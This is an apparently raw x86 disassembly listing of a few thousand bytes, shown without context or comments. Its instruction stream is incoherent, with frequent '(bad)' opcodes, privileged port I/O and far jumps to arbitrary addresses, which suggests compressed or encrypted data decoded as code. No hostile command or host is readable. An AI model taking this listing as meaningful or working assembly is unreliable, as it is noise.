  4197ed:	xchg   edx,eax
  4197ee:	jl     0x4197d6
  4197f0:	aam    0xd5
  4197f2:	test   eax,0xfc5ebf50
  4197f7:	and    ah,BYTE PTR [esi+0x69]
  4197fa:	mov    edi,0xc77c359f
  4197ff:	ret    0xfd1a
  419802:	mov    ds:0x2adbac84,eax
  419807:	retf   0xac3e
  41980a:	fidivr DWORD PTR [esi-0x2c]
  41980d:	and    esi,DWORD PTR [ecx+0x7caf41ef]
  419813:	in     al,0x2
  419815:	das    
  419816:	ja     0x4197cc
  419818:	jmp    0x4197ce
  41981a:	push   edx
  41981b:	inc    edx
  41981c:	push   ebx
  41981d:	cmp    DWORD PTR [edx],0xadeae147
  419823:	or     bh,BYTE PTR [ecx-0x27]
  419826:	(bad)  
  419827:	das    
  419828:	add    DWORD PTR [ecx+0x4f75a328],esp
  41982e:	dec    esi
  41982f:	fnsave [ecx]
  419831:	or     DWORD PTR [ebx],edi
  419833:	push   0xffffffd6
  419835:	retf   0x6016
  419838:	adc    DWORD PTR [edi-0x4b717b1e],edi
  41983e:	pushf  
  41983f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419840:	dec    ecx
  419841:	into   
  419842:	shl    BYTE PTR [edi-0x2c],cl
  419845:	mul    DWORD PTR [ebp+0x9]
  419848:	pop    ebp
  419849:	xchg   DWORD PTR [eax+0x53439ee3],esi
  41984f:	cwde   
  419850:	fld    QWORD PTR [ebx+0x51]
  419853:	call   0xe7283350
  419858:	dec    ebp
  419859:	lods   eax,DWORD PTR ds:[esi]
  41985a:	retf   0xbaf9
  41985d:	popf   
  41985e:	mov    esp,0xc2aa68f7
  419863:	sub    eax,0xadef803d
  419868:	jg     0x41980a
  41986a:	cli    
  41986b:	push   0xffffff8e
  41986d:	add    BYTE PTR [ecx+0x7174d608],0x22
  419874:	cmp    eax,0xd0dacc42
  419879:	test   DWORD PTR [edi+0x3ce4eb89],0xf0ff389d
  419883:	dec    ecx
  419884:	jne    0x4198eb
  419886:	rcr    DWORD PTR [ebp+edi*2-0x57],cl
  41988a:	xor    bl,bl
  41988c:	(bad)  
  41988d:	mov    ch,0x1e
  41988f:	sub    al,0x9f
  419891:	xor    ecx,ebx
  419893:	mov    ds:0xb948cd36,al
  419898:	xor    DWORD PTR [eax+0x56647669],esp
  41989e:	push   es
  41989f:	mov    ds:0x94f0c001,al
  4198a4:	ret    
  4198a5:	fisubr DWORD PTR [eax]
  4198a7:	or     dh,BYTE PTR [eax]
  4198a9:	dec    esi
  4198aa:	ins    DWORD PTR es:[edi],dx
  4198ab:	nop
  4198ac:	stc    
  4198ad:	push   ebx
  4198ae:	(bad)  
  4198af:	fiadd  DWORD PTR [edx-0x5c]
  4198b2:	js     0x41988e
  4198b4:	inc    eax
  4198b5:	mov    edi,0x5a444be8
  4198ba:	mov    BYTE PTR [ebx-0x677cf6e7],dh
  4198c0:	sbb    dh,dh
  4198c2:	jae    0x419895
  4198c4:	out    dx,eax
  4198c5:	adc    bl,BYTE PTR [edi-0x3d]
  4198c8:	mov    al,BYTE PTR [ebx]
  4198ca:	jmp    0x41986f
  4198cc:	ds nop
  4198ce:	cs jecxz 0x4198a3
  4198d1:	in     eax,dx
  4198d2:	add    bh,dh
  4198d4:	test   al,0x1b
  4198d6:	pop    esp
  4198d7:	fwait
  4198d8:	or     BYTE PTR [edi-0x45],bh
  4198db:	xchg   esi,eax
  4198dc:	pushf  
  4198dd:	aaa    
  4198de:	inc    edi
  4198df:	jbe    0x4198f1
  4198e1:	sub    cl,BYTE PTR [esi]
  4198e3:	call   FWORD PTR [edi-0x46]
  4198e6:	cdq    
  4198e7:	xchg   esi,eax
  4198e8:	loope  0x41987d
  4198ea:	test   DWORD PTR [ecx+ebp*1-0x6c1cd4],esi
  4198f1:	aad    0xb8
  4198f3:	imul   ecx,DWORD PTR [edx+ecx*8],0x6034f671
  4198fa:	in     eax,dx
  4198fb:	dec    esp
  4198fc:	inc    edx
  4198fd:	xchg   ecx,eax
  4198fe:	fild   QWORD PTR [ebp-0x379421d0]
  419904:	loope  0x419946
  419906:	push   esi
  419907:	mov    al,0xb2
  419909:	sar    cl,cl
  41990b:	cmp    esi,DWORD PTR [eax+0x73]
  41990e:	in     eax,0xa3
  419910:	pusha  
  419911:	ins    DWORD PTR es:[edi],dx
  419912:	cwde   
  419913:	(bad)  
  419914:	mov    edi,0x5b163a01
  419919:	pop    eax
  41991a:	sbb    ecx,DWORD PTR [ecx-0x757aa426]
  419920:	xor    ecx,esp
  419922:	or     BYTE PTR [edi+esi*8+0x743b1426],cl
  419929:	mov    eax,0x371b61be
  41992e:	popf   
  41992f:	jmp    0x41993f
  419931:	lods   al,BYTE PTR ds:[esi]
  419932:	xor    ch,cl
  419934:	push   esp
  419935:	(bad)  [ebx+0x499e9fa3]
  41993b:	(bad)  
  41993c:	sbb    ecx,DWORD PTR [esi-0x30bf53b3]
  419942:	sbb    esi,esp
  419944:	mov    eax,ds:0xfbaaa8f1
  419949:	mov    esi,0x5654acfe
  41994e:	cmp    al,0xaa
  419950:	repnz sbb eax,ecx
  419953:	retf   0x55c
  419956:	pop    ss
  419957:	out    dx,eax
  419958:	retf   
  419959:	icebp  
  41995a:	sub    al,0xf
  41995c:	enter  0x4e3f,0x23
  419960:	pop    eax
  419961:	in     al,dx
  419962:	es mov cl,0x22
  419965:	nop
  419966:	sbb    dh,dh
  419968:	xchg   esi,eax
  419969:	repz dec ebx
  41996b:	cmp    al,0x6
  41996d:	std    
  41996e:	push   esi
  41996f:	shl    DWORD PTR [ecx-0x18],0x36
  419973:	dec    edi
  419974:	sub    bh,BYTE PTR ds:0x3068b11a
  41997a:	jmp    0x2d70:0x837d1e8c
  419981:	mov    edi,0x899b0a5b
  419986:	mov    ds:0x70427345,eax
  41998b:	and    BYTE PTR ds:0x6f29da82,0x1a
  419992:	fsubr  QWORD PTR [edi+esi*2+0x7e]
  419996:	ins    DWORD PTR es:[edi],dx
  419997:	dec    esp
  419998:	mov    edi,DWORD PTR [edi]
  41999a:	inc    ebp
  41999b:	inc    edi
  41999c:	sbb    eax,DWORD PTR [ebx-0x3e]
  41999f:	fild   DWORD PTR [esi+0x36d56672]
  4199a5:	and    DWORD PTR [ecx],ebp
  4199a7:	pop    es
  4199a8:	test   BYTE PTR [eax],ch
  4199aa:	xor    DWORD PTR [eax+0xc],edi
  4199ad:	push   0x906d3031
  4199b2:	push   0xfffffff3
  4199b4:	(bad)  
  4199b5:	sbb    eax,0x1d4c8d33
  4199ba:	ins    BYTE PTR es:[edi],dx
  4199bb:	mov    BYTE PTR [ebx-0x3f],cl
  4199be:	pop    ebx
  4199bf:	pop    es
  4199c0:	cmp    DWORD PTR [esi],eax
  4199c2:	cmp    ch,BYTE PTR [ebx+0x72755e2b]
  4199c8:	push   esp
  4199c9:	cwde   
  4199ca:	ins    BYTE PTR es:[edi],dx
  4199cb:	enter  0x46e6,0x5e
  4199cf:	iret   
  4199d0:	mov    bh,0xd
  4199d2:	jne    0x419a20
  4199d4:	inc    esi
  4199d5:	xchg   ecx,eax
  4199d6:	mov    BYTE PTR [ebp+0x2f],bh
  4199d9:	popf   
  4199da:	les    esi,FWORD PTR [ebx]
  4199dc:	sahf   
  4199dd:	xchg   esi,eax
  4199de:	adc    edi,DWORD PTR [ecx+0x4b73976a]
  4199e4:	(bad)  
  4199e6:	mov    ebx,0x60de8313
  4199eb:	or     edi,DWORD PTR [esi+0x71]
  4199ee:	pop    esi
  4199ef:	fwait
  4199f0:	lahf   
  4199f1:	pop    esi
  4199f2:	test   BYTE PTR ds:0x12d5b079,dh
  4199f8:	scas   al,BYTE PTR es:[edi]
  4199f9:	clc    
  4199fa:	(bad)  
  4199fb:	repnz mov esi,0x2f313fd1
  419a01:	outs   dx,BYTE PTR ss:[esi]
  419a03:	test   al,0xb6
  419a05:	adc    edi,ebx
  419a07:	xchg   BYTE PTR [ebx-0x70],bl
  419a0a:	cmp    al,0x86
  419a0c:	jg     0x41999b
  419a0e:	ins    DWORD PTR es:[edi],dx
  419a0f:	dec    eax
  419a10:	nop
  419a11:	cmp    eax,0x657ccc75
  419a16:	or     al,0xd5
  419a18:	ret    0x2bb4
  419a1b:	test   eax,0x5c730ce1
  419a20:	push   ecx
  419a21:	daa    
  419a22:	pushf  
  419a23:	or     edx,esi
  419a25:	push   ds
  419a26:	mov    ebp,0x9d599d8d
  419a2b:	mov    esi,0xe2753949
  419a30:	sahf   
  419a31:	ficomp WORD PTR [edi]
  419a33:	in     al,0xb5
  419a35:	adc    al,0x5b
  419a37:	sti    
  419a38:	ins    BYTE PTR es:[edi],dx
  419a39:	pusha  
  419a3a:	cdq    
  419a3b:	xor    DWORD PTR [ebp-0x22],0x782326ba
  419a42:	xor    BYTE PTR [ebp-0x8],dh
  419a45:	iret   
  419a46:	mov    dh,0xc7
  419a48:	jb     0x419a13
  419a4a:	xor    DWORD PTR [edi-0x2e],ecx
  419a4d:	ds mov eax,0x4790ee29
  419a53:	xor    ch,BYTE PTR [edx]
  419a55:	or     DWORD PTR [ebx],edi
  419a57:	retf   0x3956
  419a5a:	lahf   
  419a5b:	cmp    edx,DWORD PTR [ebx+0x37f216a3]
  419a61:	mov    bl,0x6c
  419a63:	shl    BYTE PTR [esp+eax*8-0x5114a2f],1
  419a6a:	pusha  
  419a6b:	push   ecx
  419a6c:	inc    ebx
  419a6d:	and    edi,DWORD PTR [esp+esi*2]
  419a70:	jns    0x419ab0
  419a72:	jae    0x419a33
  419a74:	ret    0xfed0
  419a77:	pop    ecx
  419a78:	mov    bh,0x4b
  419a7a:	mov    ah,0xa1
  419a7c:	out    0xef,al
  419a7e:	in     al,dx
  419a7f:	pusha  
  419a80:	pop    eax
  419a81:	jmp    0xb744:0x59f8bcbe
  419a88:	add    BYTE PTR [eax],al
  419a8a:	int3   
  419a8b:	nop
  419a8c:	adc    DWORD PTR [eax+0x2e],ecx
  419a8f:	sbb    DWORD PTR [ebx-0x160e8426],0x5e
  419a96:	inc    edx
  419a97:	ror    esi,1
  419a99:	cdq    
  419a9a:	jae    0x419a64
  419a9c:	and    eax,0xc53fc460
  419aa1:	sti    
  419aa2:	fst    DWORD PTR [edx]
  419aa4:	adc    ecx,DWORD PTR [ebp-0x58]
  419aa7:	hlt    
  419aa8:	enter  0x1691,0xac
  419aac:	or     al,0xd3
  419aae:	xor    ecx,DWORD PTR [edi+0x761f2e50]
  419ab4:	add    BYTE PTR [edx-0x1a],0xdf
  419ab8:	xlat   BYTE PTR ds:[ebx]
  419ab9:	fwait
  419aba:	or     DWORD PTR [esi],ebp
  419abc:	cmp    cl,BYTE PTR [edx]
  419abe:	aas    
  419abf:	adc    al,0x7c
  419ac1:	mov    ebx,0x2a5499b0
  419ac7:	icebp  
  419ac8:	ja     0x419b24
  419aca:	sar    edi,0x57
  419acd:	fisttp WORD PTR [ebx-0x54dbde71]
  419ad3:	inc    ebp
  419ad4:	cmp    DWORD PTR [ebx-0x64],edi
  419ad7:	or     BYTE PTR [ebx],bl
  419ad9:	out    0x0,al
  419adb:	out    dx,eax
  419adc:	jmp    0x419ac7
  419ade:	mov    eax,0x487a9ca7
  419ae3:	out    0x8,al
  419ae5:	out    dx,al
  419ae6:	lods   al,BYTE PTR ds:[esi]
  419ae7:	dec    eax
  419ae8:	add    DWORD PTR [eax],ebx
  419aea:	call   0xdb7a:0x41869a27
  419af1:	dec    edx
  419af2:	push   ss
  419af3:	jge    0x419abd
  419af5:	add    DWORD PTR [edx-0x2d],0xfffffff4
  419af9:	push   ss
  419afa:	xor    DWORD PTR [edi],edi
  419afc:	jno    0x419a99
  419afe:	or     ebx,esp
  419b00:	punpckhwd mm7,mm2
  419b03:	mov    BYTE PTR [eax],al
  419b05:	jecxz  0x419a9d
  419b07:	mov    WORD PTR [ebx+0x392d266a],ds
  419b0d:	int3   
  419b0e:	fwait
  419b0f:	mov    WORD PTR [edx],ds
  419b11:	fsubr  st,st(6)
  419b13:	(bad)  
  419b14:	dec    ebp
  419b15:	mov    bl,0xea
  419b17:	dec    esp
  419b18:	inc    ebp
  419b19:	dec    ebx
  419b1a:	and    esi,DWORD PTR [edi]
  419b1c:	mov    edi,0xbfcb37a5
  419b21:	inc    edx
  419b22:	jp     0x419ada
  419b24:	push   es
  419b25:	lahf   
  419b26:	cmc    
  419b27:	sbb    eax,0x28733554
  419b2c:	mov    ds:0x10fde786,eax
  419b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b32:	dec    edx
  419b33:	cmp    BYTE PTR [ebx-0x58],al
  419b36:	add    ch,BYTE PTR [edx]
  419b38:	adc    cl,bl
  419b3a:	add    ebx,0xffffff90
  419b3d:	ds inc ebx
  419b3f:	or     al,0xbf
  419b41:	lods   al,BYTE PTR ds:[esi]
  419b42:	xchg   ebx,eax
  419b43:	scas   eax,DWORD PTR es:[edi]
  419b44:	dec    eax
  419b45:	in     eax,dx
  419b46:	in     eax,dx
  419b47:	xchg   esi,eax
  419b48:	in     al,dx
  419b49:	sbb    eax,0xfd34c16
  419b4e:	rol    ebp,0x9c
  419b51:	ret    
  419b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b53:	lods   eax,DWORD PTR ds:[esi]
  419b54:	out    0x2,eax
  419b56:	pop    ebx
  419b57:	push   ebx
  419b58:	mov    ebp,DWORD PTR [esp+edx*8+0x9]
  419b5c:	fistp  DWORD PTR [edi-0x5c]
  419b5f:	jmp    0x1d36:0x17b3c5f9
  419b66:	push   ss
  419b67:	lahf   
  419b68:	test   eax,0x723e3fc
  419b6d:	jecxz  0x419b40
  419b6f:	into   
  419b70:	das    
  419b71:	sbb    BYTE PTR [esi],0x75
  419b74:	ret    0x9f52
  419b77:	jl     0x419b69
  419b79:	(bad)  
  419b7a:	scas   eax,DWORD PTR es:[edi]
  419b7b:	scas   al,BYTE PTR es:[edi]
  419b7c:	std    
  419b7d:	xchg   edi,eax
  419b7e:	mov    al,0x82
  419b80:	xchg   esi,eax
  419b81:	and    eax,0x482efe23
  419b86:	dec    ebp
  419b87:	mov    dh,0xb4
  419b89:	scas   eax,DWORD PTR es:[edi]
  419b8a:	sbb    cl,BYTE PTR [ecx]
  419b8c:	out    dx,eax
  419b8d:	repz and BYTE PTR [esp+ebp*1-0x5076b30b],bh
  419b95:	fst    DWORD PTR [esi]
  419b97:	loope  0x419b29
  419b99:	mov    eax,0x417cc430
  419b9e:	(bad)  
  419b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ba0:	loope  0x419bb1
  419ba2:	dec    edi
  419ba3:	int3   
  419ba4:	and    cl,dh
  419ba6:	test   DWORD PTR [edx+0x7e],ecx
  419ba9:	arpl   WORD PTR [esi-0x4e],di
  419bac:	test   al,0x6b
  419bae:	sahf   
  419baf:	or     bl,BYTE PTR [esi-0x7d]
  419bb2:	jl     0x419c0d
  419bb4:	or     cl,bl
  419bb6:	inc    esp
  419bb7:	jle    0x419c12
  419bb9:	je     0x419b70
  419bbb:	mov    esi,0x65184fad
  419bc0:	aad    0x24
  419bc2:	pop    ebp
  419bc3:	add    edx,DWORD PTR [ecx+0x20]
  419bc6:	push   ecx
  419bc7:	fiadd  WORD PTR [edx+0x487aa8c0]
  419bcd:	mov    cl,0x14
  419bcf:	mov    al,0x68
  419bd1:	mov    dh,0x47
  419bd3:	pop    ss
  419bd4:	adc    al,0xc7
  419bd6:	ss mov al,cl
  419bd9:	mov    esi,0x19d88dc4
  419bde:	mov    ds:0x1de427cb,eax
  419be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be4:	test   DWORD PTR [eax-0x58b15b0a],0x2b231c88
  419bee:	sub    al,0xb4
  419bf0:	xchg   BYTE PTR [ecx],dh
  419bf2:	add    ch,BYTE PTR [edx]
  419bf4:	add    al,BYTE PTR [eax-0x59]
  419bf7:	hlt    
  419bf8:	dec    edi
  419bf9:	imul   DWORD PTR [ebx+ebx*8]
  419bfc:	mov    bh,0x7e
  419bfe:	sbb    dh,ch
  419c00:	xor    eax,0xa1b83239
  419c05:	sub    DWORD PTR [eax+eax*4-0x59],ecx
  419c09:	in     al,dx
  419c0a:	add    al,0xf2
  419c0c:	xor    ch,cl
  419c0e:	cmp    BYTE PTR [ebx+0x10],dh
  419c11:	pop    edi
  419c12:	xchg   edx,eax
  419c13:	lea    ebp,[ebp+ecx*4+0x1d9318d9]
  419c1a:	push   0xd5e74952
  419c1f:	stos   BYTE PTR es:[edi],al
  419c20:	mov    ah,0x2e
  419c22:	xchg   ecx,eax
  419c23:	cli    
  419c24:	loope  0x419bc6
  419c26:	jp     0x419bba
  419c28:	mov    WORD PTR [ebp-0x59425153],?
  419c2e:	gs clc 
  419c30:	gs ins BYTE PTR es:[edi],dx
  419c32:	push   edi
  419c33:	js     0x419c21
  419c35:	stos   BYTE PTR es:[edi],al
  419c36:	mov    eax,0xd8168070
  419c3b:	sbb    DWORD PTR [ebp-0x24586a01],esi
  419c41:	and    ecx,DWORD PTR [ebx+0x51efa052]
  419c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c48:	xlat   BYTE PTR ds:[ebx]
  419c49:	cmp    BYTE PTR [esi+0x54776924],cl
  419c4f:	inc    BYTE PTR [edi-0x1c]
  419c52:	lea    esp,[esi+0x46]
  419c55:	dec    ecx
  419c56:	mov    DWORD PTR [edi-0x32],ecx
  419c59:	xchg   ebp,eax
  419c5a:	xchg   ecx,eax
  419c5b:	dec    esp
  419c5c:	mov    es,WORD PTR [ebx]
  419c5e:	shl    bh,1
  419c60:	mov    gs,WORD PTR [edx+ebp*2]
  419c63:	aam    0x9d
  419c65:	mov    ebx,0xc0c523ae
  419c6a:	dec    esi
  419c6b:	xchg   DWORD PTR [eax],edx
  419c6d:	sbb    esi,ebp
  419c6f:	adc    al,0xcb
  419c71:	or     al,bl
  419c73:	jo     0x419c3b
  419c75:	jp     0x419cb4
  419c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c78:	imul   eax,DWORD PTR [edi+eax*2+0x68ae7603],0x86db9b96
  419c83:	and    eax,0xffdca580
  419c88:	iret   
  419c89:	mov    ebp,0xb6a2e2fe
  419c8e:	inc    ecx
  419c8f:	dec    ebx
  419c90:	inc    DWORD PTR [edx]
  419c92:	lock out 0xc1,eax
  419c95:	(bad)  
  419c96:	cmp    BYTE PTR [eax+0x28],al
  419c99:	sahf   
  419c9a:	pusha  
  419c9b:	dec    ecx
  419c9c:	loope  0x419c32
  419c9e:	inc    esp
  419c9f:	(bad)  [ebx+0x781739d]
  419ca5:	fcmovnbe st,st(6)
  419ca7:	mov    gs,WORD PTR [esi+edx*4+0x6ac4a6f]
  419cae:	cmp    ecx,DWORD PTR [edx+0x6]
  419cb1:	xchg   ebx,eax
  419cb2:	call   0x9b4d:0xede9c9d1
  419cb9:	xor    ecx,DWORD PTR [edx-0x25e60a35]
  419cbf:	in     eax,0x97
  419cc1:	pushf  
  419cc2:	jae    0x419c6f
  419cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc5:	outs   dx,BYTE PTR ds:[esi]
  419cc6:	cld    
  419cc7:	sub    ecx,DWORD PTR [ecx]
  419cc9:	jle    0x419d44
  419ccb:	push   es
  419ccc:	test   al,0x39
  419cce:	test   eax,0x26ed5070
  419cd3:	sar    edx,1
  419cd5:	dec    edx
  419cd6:	mov    ds:0x76b6c43e,al
  419cdb:	xor    edi,DWORD PTR [edx+0x15f4c0ab]
  419ce1:	fwait
  419ce2:	xchg   ebx,eax
  419ce3:	sub    ah,al
  419ce5:	cld    
  419ce6:	(bad)  
  419ce7:	mov    al,ds:0xca94ec98
  419cec:	lock dec DWORD PTR [edx+0x5c]
  419cf0:	push   ecx
  419cf1:	sbb    eax,0xdea4dd72
  419cf6:	sahf   
  419cf7:	mov    ebp,0x6de63efb
  419cfc:	and    ebp,DWORD PTR ds:0xbe377def
  419d02:	in     eax,dx
  419d03:	stos   DWORD PTR es:[edi],eax
  419d04:	push   es
  419d05:	lods   al,BYTE PTR ds:[esi]
  419d06:	add    eax,esi
  419d08:	ja     0x419d63
  419d0a:	inc    edx
  419d0b:	loope  0x419d37
  419d0d:	push   0x660fb93d
  419d12:	stc    
  419d13:	push   0xf06cdbc6
  419d18:	mov    cl,0xfc
  419d1a:	inc    ebp
  419d1b:	aad    0xf8
  419d1d:	cmc    
  419d1e:	dec    esp
  419d1f:	dec    edi
  419d20:	xor    eax,0xbe60de2c
  419d25:	frstor [edi-0x60]
  419d28:	pop    ss
  419d29:	inc    eax
  419d2a:	mov    eax,ds:0x31578fc0
  419d2f:	mov    BYTE PTR [ebp+edx*4-0x1e],al
  419d33:	popf   
  419d34:	pop    edx
  419d35:	mov    cl,0xa9
  419d37:	ins    DWORD PTR es:[edi],dx
  419d38:	mov    ds:0x6a07b327,eax
  419d3d:	and    eax,0xcc69d7c9
  419d42:	cwde   
  419d43:	clc    
  419d44:	or     eax,0xe6e6e590
  419d49:	cmp    edx,ecx
  419d4b:	cli    
  419d4c:	jns    0x419ccf
  419d4e:	jnp    0x419d85
  419d50:	icebp  
  419d51:	sbb    al,0xd1
  419d53:	push   0x55f95352
  419d58:	pop    esi
  419d59:	sub    ecx,DWORD PTR [edx-0x45]
  419d5c:	mov    ?,WORD PTR [ecx+eiz*2+0x65756094]
  419d63:	addr16 mov gs,esp
  419d66:	inc    eax
  419d67:	pop    edx
  419d68:	pop    ebx
  419d69:	loope  0x419db2
  419d6b:	xchg   edx,eax
  419d6c:	xchg   ebx,eax
  419d6d:	aad    0x81
  419d6f:	leave  
  419d70:	push   ebp
  419d71:	and    dl,BYTE PTR [ecx-0x16]
  419d74:	or     ecx,esp
  419d76:	jo     0x419d6b
  419d78:	popf   
  419d79:	dec    eax
  419d7a:	inc    esp
  419d7b:	enter  0xafb8,0x1f
  419d7f:	sub    BYTE PTR [ecx],dh
  419d81:	call   0xb4842ac6
  419d86:	dec    esp
  419d87:	inc    esi
  419d88:	sar    ch,1
  419d8a:	mov    eax,ds:0xd00a2643
  419d8f:	nop
  419d90:	and    bh,BYTE PTR [eax-0x6a]
  419d93:	pushf  
  419d94:	add    al,0x2b
  419d96:	jne    0x419de1
  419d98:	xlat   BYTE PTR ds:[ebx]
  419d99:	iret   
  419d9a:	jae    0x419d1e
  419d9c:	repz (bad) 
  419d9e:	retf   0x1a3d
  419da1:	cwde   
  419da2:	and    ebp,0x8
  419da5:	out    0xdc,al
  419da7:	jnp    0x419d5e
  419da9:	inc    ebp
  419daa:	pop    ecx
  419dab:	ins    BYTE PTR es:[edi],dx
  419dac:	stos   BYTE PTR es:[edi],al
  419dad:	pushf  
  419dae:	jge    0x419dfb
  419db0:	scas   al,BYTE PTR es:[edi]
  419db1:	out    0xac,al
  419db3:	push   edx
  419db4:	jmp    0xb267:0x29b4bb0d
  419dbb:	ss dec ebx
  419dbd:	xor    BYTE PTR [eax+edx*2+0x17],al
  419dc1:	nop
  419dc2:	les    ebx,FWORD PTR [edx-0xe]
  419dc5:	cs xchg ecx,eax
  419dc7:	cli    
  419dc8:	jg     0x419dec
  419dca:	lea    ecx,[esi+0x6f]
  419dcd:	jle    0x419e48
  419dcf:	adc    eax,0xcefb5a8e
  419dd4:	sub    DWORD PTR [esi-0x47e667d5],esp
  419dda:	test   DWORD PTR [edi],esi
  419ddc:	xor    bl,BYTE PTR [edx]
  419dde:	(bad)  
  419ddf:	and    BYTE PTR [ebx],ah
  419de1:	jge    0x419dce
  419de3:	pop    edi
  419de4:	pop    ss
  419de5:	pop    eax
  419de6:	out    dx,eax
  419de7:	fadd   st(0),st
  419de9:	pop    ss
  419dea:	es fs popf 
  419ded:	test   BYTE PTR [eax+0x3ea66f3f],0xab
  419df4:	gs push ebx
  419df6:	jnp    0x419e39
  419df8:	cs inc eax
  419dfa:	fadd   st(2),st
  419dfc:	or     al,0xe4
  419dfe:	mov    al,BYTE PTR [ebp+0x37]
  419e01:	gs dec esi
  419e03:	mov    ch,0x38
  419e05:	jae    0x419dae
  419e07:	mov    ah,0x66
  419e09:	and    BYTE PTR [eax+ebx*1],0x17
  419e0d:	pop    ebp
  419e0e:	inc    edi
  419e0f:	dec    ebp
  419e10:	jnp    0x419e61
  419e12:	mov    al,ds:0xab953ccc
  419e17:	or     eax,0x968d0fc2
  419e1c:	or     DWORD PTR [ebx+esi*1-0x57138a94],eax
  419e23:	fild   WORD PTR [eax+0x74]
  419e26:	cli    
  419e27:	imul   ebp,DWORD PTR ds:0x8a09b183,0xa61495ed
  419e31:	popa   
  419e32:	std    
  419e33:	popa   
  419e34:	jecxz  0x419e55
  419e36:	js     0x419df1
  419e38:	pop    ebp
  419e39:	fldenv [ecx+0x1f4c92cb]
  419e3f:	ja     0x419dd8
  419e41:	lock fld DWORD PTR [edx]
  419e44:	add    al,bl
  419e46:	pop    ds
  419e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e48:	shr    DWORD PTR [ecx],1
  419e4a:	loopne 0x419e94
  419e4c:	push   0x33
  419e4e:	enter  0x9c12,0xdc
  419e52:	fmul   QWORD PTR [ecx+edx*2+0x1b]
  419e56:	jle    0x419e7d
  419e58:	xor    ebx,DWORD PTR [esi]
  419e5a:	loope  0x419ea8
  419e5c:	cmp    BYTE PTR ds:0xe3c967f7,dh
  419e62:	and    DWORD PTR [edx+0x4759dcc2],edx
  419e68:	popf   
  419e69:	mov    edi,0xe08e2678
  419e6e:	push   ebx
  419e6f:	frstor [esi-0x30046389]
  419e75:	and    ebx,DWORD PTR [ecx+0x5303a960]
  419e7b:	mov    al,ds:0x3bda13ee
  419e80:	adc    esi,edi
  419e82:	xor    eax,0x8c623d55
  419e87:	push   cs
  419e88:	mov    ebp,0x39eee6d
  419e8d:	push   ss
  419e8e:	(bad)  
  419e8f:	fcom   DWORD PTR [edi-0x18b630ba]
  419e95:	fidiv  WORD PTR [ecx]
  419e97:	mov    esp,0xe8fec126
  419e9c:	or     edx,DWORD PTR [eax+0xb749e7e]
  419ea2:	ja     0x419e2a
  419ea4:	jecxz  0x419eb6
  419ea6:	xchg   ebx,eax
  419ea7:	(bad)  
  419ea8:	test   DWORD PTR [ecx],esp
  419eaa:	imul   ecx,DWORD PTR [esi],0xe376608f
  419eb0:	push   ss
  419eb1:	fisttp WORD PTR [edx-0x44f0f709]
  419eb7:	inc    edx
  419eb8:	jns    0x419e69
  419eba:	loope  0x419f09
  419ebc:	mov    es,WORD PTR [ebx-0x675a2576]
  419ec2:	xchg   edi,eax
  419ec3:	mov    ds:0x8ffae187,eax
  419ec8:	and    bl,BYTE PTR [eax-0x6d]
  419ecb:	push   eax
  419ecc:	scas   al,BYTE PTR es:[edi]
  419ecd:	jb     0x419e87
  419ecf:	test   bl,bl
  419ed1:	xor    eax,DWORD PTR [ebx+ecx*8]
  419ed4:	jno    0x419ea4
  419ed6:	jbe    0x419ea6
  419ed8:	outs   dx,BYTE PTR ds:[esi]
  419ed9:	fwait
  419eda:	loopne 0x419eb3
  419edc:	int3   
  419edd:	cmp    eax,0xf1938b11
  419ee2:	mov    ?,WORD PTR [esi+0x53c3dc6d]
  419ee8:	mov    edx,0x6421f7c6
  419eed:	(bad)  
  419eee:	pop    esi
  419eef:	mov    cl,0x12
  419ef1:	test   DWORD PTR [eax],edi
  419ef3:	xchg   esp,eax
  419ef4:	ret    0x9933
  419ef7:	int    0x5a
  419ef9:	cmp    eax,0xfc9d80e0
  419efe:	imul   dl
  419f00:	dec    esi
  419f01:	inc    ebp
  419f02:	cmp    DWORD PTR [ecx+0x66],esp
  419f05:	lahf   
  419f06:	cwde   
  419f07:	cmp    DWORD PTR [eax+0xa0f309b],ebp
  419f0d:	sub    BYTE PTR [ebx-0x685a4e10],dl
  419f13:	idiv   BYTE PTR [ebx-0x6a]
  419f16:	scas   al,BYTE PTR es:[edi]
  419f17:	ss xchg esi,eax
  419f19:	add    eax,0x733185ec
  419f1e:	xlat   BYTE PTR ds:[ebx]
  419f1f:	inc    eax
  419f20:	mov    esi,0xb11278a
  419f25:	cld    
  419f26:	xor    DWORD PTR [eax-0x68042ed8],ebx
  419f2c:	cmc    
  419f2d:	dec    ecx
  419f2e:	loope  0x419eb7
  419f30:	add    eax,0xe4c41e40
  419f35:	push   ss
  419f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f37:	jns    0x419f17
  419f39:	ret    0xa0d4
  419f3c:	popa   
  419f3d:	dec    ebx
  419f3e:	rcr    BYTE PTR [ebp-0xc],1
  419f41:	clc    
  419f42:	push   ds
  419f43:	enter  0x7d9,0xbf
  419f47:	push   eax
  419f48:	aaa    
  419f49:	adc    DWORD PTR [edx],ebp
  419f4b:	stc    
  419f4c:	adc    edi,DWORD PTR ds:0x3dfbcfc1
  419f52:	cmp    al,0xd4
  419f54:	dec    esi
  419f55:	rol    eax,cl
  419f57:	sbb    DWORD PTR [edx-0x20270e51],esp
  419f5d:	nop
  419f5e:	xchg   ebx,eax
  419f5f:	xlat   BYTE PTR ds:[ebx]
  419f60:	enter  0x1e3c,0xce
  419f64:	fwait
  419f65:	push   es
  419f66:	scas   eax,DWORD PTR es:[edi]
  419f67:	and    al,0xee
  419f69:	test   eax,0xbc50a913
  419f6e:	addr16 nop
  419f70:	inc    ebp
  419f71:	imul   ebx,DWORD PTR [ebx],0xfffffff3
  419f74:	mov    edx,0xe60e3813
  419f79:	(bad)  
  419f7a:	dec    esi
  419f7b:	add    ebp,ebx
  419f7d:	into   
  419f7e:	or     BYTE PTR [ebp-0x25],dl
  419f81:	shr    ecx,0x0
  419f84:	and    esi,DWORD PTR [esi-0x5e]
  419f87:	sahf   
  419f88:	in     al,dx
